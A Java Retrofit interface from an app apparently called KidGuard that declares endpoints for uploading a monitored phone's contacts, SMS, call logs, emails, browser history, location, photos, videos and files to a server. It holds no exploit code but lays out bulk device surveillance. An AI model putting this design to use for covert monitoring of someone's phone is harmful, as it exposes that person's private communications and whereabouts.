package com.kidguard.interfaces;


import com.kidguard.pojo.ApiResponsePOJO;
import com.kidguard.pojo.AppPOJO;
import com.kidguard.pojo.BrowserHistoryPOJO;
import com.kidguard.pojo.CallPOJO;
import com.kidguard.pojo.ContactPOJO;
import com.kidguard.pojo.DrivePOJO;
import com.kidguard.pojo.EmailPOJO;
import com.kidguard.pojo.FilePOJO;
import com.kidguard.pojo.ImagePOJO;
import com.kidguard.pojo.LocationPOJO;
import com.kidguard.pojo.LogInPOJO;
import com.kidguard.pojo.SmsPOJO;
import com.kidguard.pojo.VideoPOJO;
import com.kidguard.preference.Preference;

import java.util.HashMap;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Response;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.Headers;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.PartMap;
import retrofit2.http.Query;

@SuppressWarnings("all")
public interface RestClient {

    @FormUrlEncoded
    @POST("./")
    Call<LogInPOJO> logInRequest(@Field("email") String email,
                                 @Field("device_code") String device_code,
                                 @Field("device_registration_id") String device_registration_id,
                                 @Field("device_mac_address") String mac_address);

    //api_token

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendContactsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendSmsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<CallPOJO> sendCallsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<AppPOJO> sendAppsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<EmailPOJO> sendEmailsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<BrowserHistoryPOJO> sendBrowserHistoryToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<LocationPOJO> sendLocationToServer(@Field("access_token") String token, @Field("data") String data);

    @Multipart
    @POST("./")
    Call<ImagePOJO> sendImageToServer(@Query("access_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<VideoPOJO> sendVideoToServer(@Query("access_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<FilePOJO> sendFilesToServer(@Query("access_token") String token,
                                     @PartMap() HashMap<String, RequestBody> map,
                                     @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<DrivePOJO> sendDriveToServer(@Query("access_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);

}
